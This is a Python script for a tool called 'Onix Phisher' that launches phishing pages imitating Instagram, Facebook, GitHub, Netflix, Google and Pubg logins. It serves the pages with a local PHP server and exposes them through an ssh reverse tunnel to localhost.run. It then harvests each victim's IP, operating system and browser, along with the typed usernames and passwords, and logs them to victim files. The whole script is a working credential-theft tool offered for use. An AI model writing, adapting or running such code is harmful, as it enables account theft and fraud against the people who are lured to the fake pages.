import sys ; sys.dont_write_bytecode = True
from time import sleep
import subprocess
import linecache
import banner
import json
import os

#For Windows====================================================================================================
if os.name == "nt":
    try:
        from colorama import Fore , init; init()
        import pandas as pd
        
    except (ImportError , ModuleNotFoundError):
        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
        if install == "y" or install == "Y":
            subprocess.call("pip install -r requirements.txt" , shell=True)
            sleep(0.5)
            pass
        else:
            exit("\nhave a good day".title())

#For linux====================================================================================================
else:
    try:
        from colorama import Fore , init ;init()
        import pandas as pd
        
    except (ImportError , ModuleNotFoundError):
        try:
            package_installer = input("\nEnter your package installer (like 'apt install' or 'pacman -S') >> ")
            python_v = input("\nYour linux using [1]python3 or [2]python for installing packages of python (Enter 1 or 2) >> ")
            if python_v == "1":
                subprocess.call(f"{package_installer} python3-colorama python3-pandas" ,  shell=True)
                sys.exit()
                
            elif python_v == "2":
                subprocess.call(f"{package_installer} python-colorama python-pandas" ,  shell=True)
                sys.exit()
        except NameError:
            exit("\nWrong package installer name or python name !")
        except KeyboardInterrupt:
            exit("\n\nUser Exited :)")
        
#Change Title====================================================================================================
if os.name == "nt":
    os.system("title Onix Phisher")
else:
    pass
#build localhost====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}") ,stderr=log , stdout=log , shell=True)
#build host====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
#smooth print====================================================================================================
def Sprint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    sleep(0.1)
#smooth rotation====================================================================================================
def rotation(text):
    for _ in range(4):
        print(Fore.BLUE + "[\\]" ,text ,  end= "\r")
        sleep(0.7)
        print(Fore.RED + "[|]" , end= "\r")
        sleep(0.7)
        print(Fore.CYAN + "[/]" , end= "\r")
        sleep(0.7)
        print(Fore.GREEN + "[-]" , end= "\r" + Fore.RESET)
        sleep(0.7)
#run with sudo ====================================================================================================
if os.name == "posix":
    uid = os.getuid()
    if uid == 1000:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Onix.py)""")
else:
    pass
#check php====================================================================================================

check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)

if check != 0:
    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
    sys.exit()

#clear screen====================================================================================================
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()

sleep(0.1)

#Banner ====================================================================================================
banner.banner()
#choices====================================================================================================
print(f""" 

{Fore.RED}[{Fore.LIGHTGREEN_EX}01{Fore.RED}]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[{Fore.LIGHTGREEN_EX}02{Fore.RED}]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[{Fore.LIGHTGREEN_EX}03{Fore.RED}]{Fore.LIGHTWHITE_EX} Github  

{Fore.RED}[{Fore.LIGHTGREEN_EX}04{Fore.RED}]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[{Fore.LIGHTGREEN_EX}05{Fore.RED}]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[{Fore.LIGHTGREEN_EX}06{Fore.RED}]{Fore.LIGHTWHITE_EX} Pubg


{Fore.RED}[{Fore.LIGHTGREEN_EX}X{Fore.RED}]{Fore.LIGHTWHITE_EX} Port Scanner  {Fore.RED}[{Fore.LIGHTGREEN_EX}XX{Fore.RED}]{Fore.LIGHTWHITE_EX} Help

{Fore.RED}[{Fore.LIGHTGREEN_EX}0{Fore.RED}]{Fore.LIGHTWHITE_EX} Exit{Fore.RESET}
""")


try:
    ask = input(Fore.MAGENTA + f"Which Option You Want {Fore.GREEN}⮞ " + Fore.RESET)
except KeyboardInterrupt:
    exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
   
#option 0 ====================================================================================================
def zero_exit():
    sys.exit()


#option 1 ====================================================================================================
def instagram():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/instagram")


#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)


    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
#====================================================================================================
    php_server()
    
    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================

    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
    
#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open("username_key.txt")  
                data = open("data.txt","a")
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open("password_key.txt")  
                data = open("data.txt","a")
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()


#option 2 ====================================================================================================
def facebook():
    global port
    
    path = os.getcwd()
    os.chdir(rf"{path}/facebook")
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
            

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
            exit(f"""{Fore.YELLOW}│
    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break
#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
  
#option 3 ====================================================================================================
def netflix():
    global port

    path = os.getcwd()
    os.chdir(rf"{path}/Netflix")
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
            

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
            exit(f"""{Fore.YELLOW}│
    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")

#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    
                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
    
                    break
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(9)
                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break
#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()


#option 4====================================================================================================
def Google():
    global port
    
    path = os.getcwd()
    os.chdir(rf"{path}/Google")
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
            

    except KeyboardInterrupt:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
            exit(f"""{Fore.YELLOW}│
    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()
                    
                
                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(9)
                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break
#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
   
#option 5 ====================================================================================================
def Github():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/Github")
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
            

    except KeyboardInterrupt:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
            exit(f"""{Fore.YELLOW}│
    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit() 

#option 6 ====================================================================================================
def Pubg():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/Pubg")
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
        if port > 65535:
            exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
            

    except KeyboardInterrupt:
            exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()
    
    try:
        print(" ")
        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
        
    print("                          " , end="\r")
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    sleep(0.1)
    linecache.clearcache()
    
    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
        
#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                
                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    
#write username====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break
#write password====================================================================================================

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break
#kill php proccess and exit====================================================================================================

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    
#Run functions ====================================================================================================
if ask == "0":
    zero_exit()

if ask == "x" or ask == "X":
    path_app = os.getcwd()
    os.chdir(f"{path_app}/Port_Scan")
    subprocess.call("python Port_Scanner.py" , shell=True)
    
if ask == "1" or ask == "01":
    instagram()

if ask == "2" or ask == "02":
    facebook()

if ask == "3" or ask == "03":
    Github()
    
if ask == "4" or ask == "04":
    netflix()
    
if ask == "5" or ask == "05":
    Google()

if ask == "6" or ask == "06":
    Pubg()
    
if ask == "xx" or ask == "XX":
    clear()
    with open("help.txt" , "r") as hint:
        print(Fore.LIGHTWHITE_EX + hint.read() + Fore.RESET)
        
    go_back = input(f"\n\r{Fore.YELLOW}[+]{Fore.BLUE} Want To Go Back To Program {Fore.GREEN}(y/n) {Fore.BLUE}: " + Fore.RESET)
    
    if go_back == "y" or go_back == "Y":
        subprocess.call("python Onix.py" , shell=True)  
    elif go_back == "n" or go_back == "N":
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.BLUE}[+]{Fore.GREEN} Have a Good Day""")
        
    else:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.BLUE}[-]{Fore.RED} No Such Option !""")

else:
    exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.BLUE}[-]{Fore.RED} No Such Option !""")